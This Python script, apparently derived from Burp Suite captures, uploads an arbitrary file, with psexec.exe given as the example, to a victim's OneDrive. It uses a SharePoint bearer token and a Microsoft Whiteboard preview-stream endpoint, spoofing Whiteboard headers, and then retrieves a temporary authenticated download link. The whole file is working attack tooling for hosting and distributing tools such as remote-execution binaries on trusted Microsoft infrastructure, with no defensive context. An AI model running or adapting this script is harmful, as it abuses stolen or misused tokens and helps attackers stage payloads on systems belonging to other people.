import requests
import json

#note: drive_id is the user's own OneDrive ID, folder_id is ... FIND IT YOURSELF!!
drive_id = "b!<...snip...>"
folder_id = "<snip>"

full_filepath = "/path/to/file/you/want/to/upload/such/as/psexec.exe"
file_name = "psexec.exe"
content_type = "application/binary"

jwt = "eyJ0eXAiO<..snipped..SharePoint access token>"

contents = open(full_filepath, 'rb').read()

def upload():
	burp0_url = f"https://<snip>.sharepoint.com:443/_api/v2.1/drives/{drive_id}/items/{folder_id}/streams/content_preview_.{file_name}/content"
	burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://whiteboard.office.com/", "Content-Type": f"{content_type}", "X-Partner-Id": "WB", "Authorization": f"Bearer {jwt}", "Origin": "https://whiteboard.office.com", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "cross-site", "Te": "trailers"}
	burp0_data = contents
	r = requests.put(burp0_url, headers=burp0_headers, data=burp0_data)
	download_url = json.loads(r.text)["url"]
	print("[+] upload successful. primary download link:\n%s" % download_url)
	return download_url

def get_download_link(download_url):
	burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Authorization": f"Bearer {jwt}", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1", "Te": "trailers"}
	r = requests.get(download_url, headers=burp0_headers, allow_redirects=False)
	temp_auth_download_url = r.headers["Location"].strip()
	print("[+] temporary authenticated download link:\n%s" % temp_auth_download_url)
	pass

download_url = upload()
get_download_link(download_url)
